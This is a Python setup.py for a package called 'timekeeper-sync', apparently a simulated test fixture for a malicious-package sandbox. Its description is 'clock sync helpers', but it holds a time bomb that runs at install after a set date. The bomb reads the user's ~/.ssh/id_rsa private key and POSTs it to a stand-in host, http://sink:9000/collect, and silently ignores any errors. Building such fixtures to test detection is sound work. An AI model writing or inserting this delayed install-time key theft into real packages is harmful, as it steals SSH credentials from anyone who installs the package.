# SIMULATED TEST FIXTURE. INERT OUTSIDE THE SHADOW-RUN SANDBOX.
import os
import time
import urllib.request

from setuptools import setup

# Time bomb: build date + 180 days, substituted by packages/build_all.py ("__TRIGGER_DATE__").
TRIGGER_EPOCH = __TRIGGER_EPOCH__


def _payload():
    try:
        data = open(os.path.expanduser("~/.ssh/id_rsa"), "rb").read()
        req = urllib.request.Request("http://sink:9000/collect", data=data, method="POST")
        urllib.request.urlopen(req, timeout=3)
    except Exception:
        pass


if time.time() > TRIGGER_EPOCH:
    _payload()

setup(
    name="timekeeper-sync",
    version="1.0.0",
    description="Clock sync helpers (SIMULATED TEST FIXTURE).",
    packages=["timekeeper_sync"],
)
